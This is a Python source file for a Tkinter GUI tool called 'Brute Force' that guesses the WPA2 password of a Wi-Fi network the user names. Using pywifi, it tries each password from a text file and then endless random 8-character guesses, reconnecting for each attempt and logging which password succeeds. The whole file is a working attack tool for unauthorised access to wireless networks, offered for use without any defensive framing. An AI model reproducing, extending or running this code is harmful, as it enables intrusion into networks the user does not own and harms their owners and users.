import pywifi

from time import sleep
from random import choice
from datetime import datetime
from os import listdir
from datetime import datetime
from threading import Thread

from tkinter import Button, scrolledtext, Tk, Entry, Label
from tkinter.messagebox import showerror, showinfo



class app:
	def __init__(self):
		self.window = Tk()
		self.width, self.height = self.window.winfo_screenwidth(), self.window.winfo_screenheight()
		self.window.title("Brute Force⚡")
		self.window.geometry(f'{int(self.width/1.5)}x{int(self.height/1.5)}')
		self.window.resizable(width=False, height=False)
		self.window["bg"] = "gray22"
		self.window.iconbitmap('icon.ico')
		self.work = False
		self.gen_psw = list()
		self.main()

	def connection(self, name, password):
		wifi = pywifi.PyWiFi()
		ifaces = wifi.interfaces()[0]
		ifaces.disconnect()
		if ifaces.status() == pywifi.const.IFACE_DISCONNECTED:
			profile = pywifi.Profile()
			profile.ssid = name
			profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
			profile.key = password
			profile.auth = pywifi.const.AUTH_ALG_OPEN
			profile.cipher = pywifi.const.CIPHER_TYPE_CCMP

			ifaces.remove_all_network_profiles()

			temp_profile = ifaces.add_network_profile(profile)

			ifaces.connect(temp_profile)
			sleep(3)

			if ifaces.status() == pywifi.const.IFACE_CONNECTED:return True
			else:return False


	def create_time(self): return f'{str(datetime.now()).split(" ")[0].replace("-", ".")} - {str(datetime.now()).split(" ")[1].split(".")[0]}'




	def log(self, text, dt: bool = True, tp: int = 3):
		if 'LOG.txt' not in listdir():open('LOG.txt', 'w')
		if dt:txt = f'\n[{self.create_time()}] {text}'
		else:txt=f'\n{text}'
		if tp == 1 or tp == 3:
			with open('LOG.txt', 'r') as file:
				log = file.read()
				with open('LOG.txt', 'w') as file:
					file.write(f"{log}{txt}")
		if tp == 2 or tp == 3:
			self.log_text.configure(state='normal')
			self.log_text.insert(0.3, txt)
			self.log_text.configure(state='disabled')

	def load_psw(self):
		if 'passwords.txt' not in listdir():
			open('passwords.txt', 'w')
			showinfo("Info", 'Document with passwords not found, a new file has been created in which you can write passwords next time. The process will work with automatic generation.\nWhen filling out a text document with passwords, write each password on a new line')
			return []
		else:
			with open('passwords.txt', 'r') as file:
				psw = file.read()
				return psw.split('\n')


	def stop(self):
		if self.work:
			self.work = False
			self.log(f"Brute force process stopped.")
		else:showerror("Stop error", 'Brute force process not running.')

	def generate_psw(self, num:int = 8):
		while True:
			words = list()
			for i in range(num):
				words.append(choice('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXW-_Z'))
			psw = "".join(words)
			if psw not in self.gen_psw:break

		self.gen_psw.append(psw)
		return psw
	def process(self, name):
		self.passwords = self.load_psw()
		self.log(f"launch...\n")
		for i in self.passwords:
			if self.work != True:exit()
			out = self.connection(name=name, password=i)
			if out:
				self.log(f"- [{i}] - Password correct !")
				self.work = False
				showinfo("Successfully✔", 'Password guessed✔')
				exit()
			else:self.log(f"- [{i}] - Password didn't match.")
		self.log(f"Passwords from a text document did not fit. Run iteration with automatic generation....")
		while self.work:
			psw = self.generate_psw()
			out = self.connection(name=name, password=psw)
			if out:
				self.log(f"- [{psw}] - Password correct !")
				self.work = False
				showinfo("Successfully✔", 'Password guessed✔')
				exit()
			else:self.log(f"- [{psw}] - Password didn't match.")

	def runProcess(self):
		if self.work != True:
			net = self.nets.get()
			if net == 'No selected' or net == '' or net == ' ':showerror("Selection error", 'You have not selected a network for brute force.')
			else:
				self.work = True
				Thread(target=self.process, args=(net,)).start()
		else:showerror("Runing error", 'The process is already running.')

	def main(self):
		self.log_text = scrolledtext.ScrolledText(self.window, width=int(self.width/2/6.03), height=int(self.height/2/15), foreground='white', background='gray')
		self.run = Button(self.window, text="RUN", command=self.runProcess, background='gray56')
		self.stp = Button(self.window, text="STOP", command=self.stop, background='gray56')
		self.nets = Entry(background='gray56')
		self.nets.insert(0, "No selected")
		self.lbl = Label(text="Enter network name for brute force:")
		self.lbl["bg"] = "gray22"
		self.lbl["fg"] = "white"

		self.author = Label(text="Made by Xsarz")
		self.author["bg"] = "gray22"
		self.author["fg"] = "white"

		self.log_text.grid(column=0, row=0, padx=5, pady=4)
		self.run.grid(column=0, row=1, pady=4)
		self.stp.grid(column=0, row=2)
		self.lbl.grid(column=0, row=3, pady=6)
		self.nets.grid(column=0, row=4)
		self.author.grid(column=0, row=5)


		self.log('\n\n\n\\\\. New launch .//\n\n', dt=False, tp=1)
		self.log('Hello! Choose a network for brute force and let the magic begin!', dt=False, tp=2)
		self.window.mainloop()



if __name__ == '__main__':
	app()